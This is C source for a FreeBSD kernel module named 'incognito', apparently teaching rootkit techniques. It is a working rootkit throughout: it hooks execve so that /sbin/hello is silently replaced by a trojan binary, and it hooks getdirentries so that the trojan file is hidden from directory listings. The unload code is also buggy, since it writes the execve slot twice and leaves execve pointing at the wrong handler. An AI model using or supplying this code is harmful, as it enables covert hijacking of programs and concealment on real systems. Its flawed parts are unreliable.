#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/dirent.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define ORIGINAL	"/sbin/hello"
#define TROJAN		"/sbin/trojan_hello"
#define T_NAME		"trojan_hello"

/* sys_execve syscall hook */
/* Redirects the execution of ORIGINAL into TROJAN */
static int execve_hook( struct thread *td, void *syscall_args)
{
	struct execve_args /* {
		char *fname;
		char **argv;
		char **envv;
	} */ *uap;
	uap = (struct execve_args *)syscall_args;

	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace *vm;
	vm_offset_t base, addr;
	char t_fname[] = TROJAN;

	/* Check if we want to redirect this process */
	if (strcmp(uap->fname, ORIGINAL) == 0)
	{
		/* Determine the end boundary address of the current 
		 * process's user data space */
		vm = curthread->td_proc->p_vmspace;
		base = round_page((vm_offset_t) vm->vm_daddr);
		/* If fname is "/sbin/hello", then we store the end boundary address of the current process's user data space in addr */
		addr = base + ctob(vm->vm_dsize);

		/* Allocate a PAGE_SIZE null region of memory for w
		 * new set of execve arguments */
		/* vm_map_find() will map a PAGE_SIZE block of NULL memory at the location we stored in addr. This will allow us to store the arguments passed to the process in userland */
		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0);
		vm->vm_dsize += btoc(PAGE_SIZE);

		/* Set up an execve_args structure for TROJAN. Remeber, you
		 * have to set place this structure into user space, and 
		 * because you can't point to an element in kernel space once
		 * you are in user space, you'll have to play any new "arrays" that
		 * this structure points to in user space as well. */
		/* We have to mimic the argument structure that the real SYS_execve expects */
		copyout(&t_fname, (char *)addr, strlen(t_fname));
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv	= uap->argv;
		kernel_ea.envv	= uap->envv;

		/* Copy out the TROJAN execve_args structure */
		user_ea = (struct execve_args *)addr + sizeof(t_fname);
		/* Store the argument structure in the allocated memory space (addr) */
		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

		/* Execute TROJAN */
		return (sys_execve(curthread, user_ea));
	}

	return (sys_execve(td, syscall_args));
}

/* getdirentries system call hook */
/* Hide the file T_NAME */
static int getdirentries_hook (struct thread *td, void *syscall_args)
{
	struct getdirentries_args /* {
		int fd;
		char *buf;
		u_int count;
		long *basep;
	} */ *uap;
	uap = (struct getdirentries_args *)syscall_args;

	struct dirent *dp, *current;
	unsigned int size, count;

	/* Store the directory entries found in fd in buf, and record the number
	 * of bytes actually transferred */
	/* 1 */
	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];

	/* Does fd actually contain any directory entries */
	/* 2 */
	if (size > 0)
	{
		dp = (struct dirent *) malloc( size, M_TEMP, M_NOWAIT);
		/* 3 */
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		/* Iterate through the directory entries found in fd/
		 * Note: The last directory entry always has a record length
		 * of zero */
		while ((current->d_reclen != 0) && (count > 0))
		{
			count -= current->d_reclen;

			/* Do we want to hide this file? */
			/* 4 */
			if (strcmp((char *)&(current->d_name), T_NAME) == 0)
			{
				/* Copy every directory found after T_NAME over
				 * T_NAME, effectively cutting it out */
				if (count != 0)
					/* 5 */
					bcopy((char *)current +
							current->d_reclen, current,
							count);

				size -= current->d_reclen;
				break;
			}

			/* Are there still more directories to look through? */
			if (count != 0)
				/* Advanced to the next record */
				current = (struct dirent *)((char *) current +
						current ->d_reclen);
		}

		/* If T_NAME was found in fd, adjust the "return values" to hide it.
		 * If T_NAME wasn't found...don't worry about it. */
		/* 6 */
		td->td_retval[0] = size;
		/* 7 */
		copyout(dp, uap->buf, size);

		free(dp, M_TEMP);
	}

	return(0);
}

/* The function called at load/unload */
static int load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch(cmd)
	{
		case MOD_LOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
			sysent[SYS_execve].sy_call = (sy_call_t *)sys_getdirentries;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return(error);
}

static moduledata_t incognito_mod = {
	"incognito",		/* module name */
	load, 			/* event handler */
	NULL
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
